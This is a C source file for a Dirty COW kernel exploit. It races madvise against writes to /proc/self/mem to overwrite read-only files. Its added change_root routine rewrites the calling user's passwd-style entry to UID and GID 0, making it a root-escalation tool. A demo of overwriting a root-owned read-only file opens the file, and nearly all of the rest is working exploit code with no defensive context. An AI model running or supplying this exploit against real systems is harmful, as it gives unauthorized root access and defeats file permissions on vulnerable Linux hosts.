/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#define ESC          "\033"
#define LOOP 100000000
 
void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i, c = 0;
  for(i=0;i<LOOP;i++) {
    /*
    * You have to reset the file pointer to the memory position.
    **/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  if (c == LOOP * strlen(str)) {
    printf (ESC "[33mprocself mem success" ESC "[0m\n");
  }else {
    printf (ESC "[31mprocself mem failed" ESC "[0m\n");
  }
}
 
char*
change_root(char *name)
{
  FILE            *fp;
  char            *curr_name;
  char            buf[1024];
  char            tmpbuf[100] = {'\0'};
  struct passwd  *pwd;
  char           *tab1, *tab2, *tab3, *tab4;
  char            writen[102400];

  fp=fopen(name, "r");
  pwd = getpwuid(getuid());
  curr_name = pwd->pw_name;
  while (fgets(buf, 1024, fp)) {
      tab1 = strchr(buf, ':'); 
      strncpy(tmpbuf, buf, tab1 - buf);
      if (!strcmp(tmpbuf, curr_name)) {
          char mod_buf[1024] = {'\0'};
          strcat(mod_buf, curr_name);
          tab2 = strchr(tab1 + 1, ':');
          tab3 = strchr(tab2 + 1, ':');
          tab4 = strchr(tab3 + 1, ':');
          strcat(mod_buf, ":x:0:0");
          strcat(mod_buf, tab4);

          strcat(writen, mod_buf);
      } else {
          strcat(writen, buf);
      }
      memset(tmpbuf, '\0', 100);
  }

  return strdup(writen);
}

 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<2)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  char *writen = change_root(name);
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,writen);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  free(writen);
  return 0;
}
